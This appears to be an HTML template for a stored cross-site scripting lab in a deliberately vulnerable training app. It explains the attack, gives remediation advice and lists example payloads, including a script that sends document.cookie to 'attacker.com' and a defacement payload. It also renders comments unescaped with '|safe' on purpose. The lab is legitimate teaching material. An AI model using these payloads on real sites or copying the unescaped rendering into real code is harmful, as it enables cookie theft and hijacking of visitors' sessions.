{% extends "base.html" %}
{% block title %}Stored XSS{% endblock %}
{% block content %}
<h1>Stored XSS Lab</h1>
<div class="explanation">
    <strong>What is it?</strong> Whatever you post in the comment is saved and shown to everyone who views the page. If the server doesn’t escape HTML, your script runs in every visitor’s browser—no need to send a link.
</div>
<details class="hints">
    <summary>Hints (click to expand)</summary>
    <ul>
        <li>Post a comment that includes HTML/JS, e.g. <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>. Reload the page—the script runs when the comment is rendered.</li>
        <li>Try storing <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code> to see how cookie theft could work (cookie may be empty if not logged in).</li>
        <li>Stored XSS is worse than reflected: one payload affects all users who view that page.</li>
    </ul>
</details>
<div class="exploit-details">
    <p><strong>OWASP:</strong> Related to A03 Injection (CWE-79)</p>
    <p><strong>Impact:</strong> Same as reflected XSS, but payload runs for every visitor; worm potential; persistent phishing or credential theft.</p>
    <details><summary>Example payloads</summary>
        <ul>
            <li><code>&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</code> – exfiltrate cookies</li>
            <li><code>&lt;img src=x onerror="document.body.innerHTML='You have been hacked'"/&gt;</code></li>
        </ul>
    </details>
    <p><strong>Remediation:</strong> Encode all user-generated content when rendering; sanitize/allowlist on input; CSP and secure cookie flags.</p>
</div>
<form method="post">
    <label>Author: <input type="text" name="author" value="Anonymous" /></label>
    <label>Comment: <textarea name="content"></textarea></label>
    <button type="submit">Post</button>
</form>
<hr />
<h2>Comments</h2>
{% for c in comments %}
<div>
    <strong>{{ c.author }}</strong> – {{ c.created_at }}<br />
    {{ c.content|safe }}
</div>
<hr />
{% endfor %}
{% endblock %}
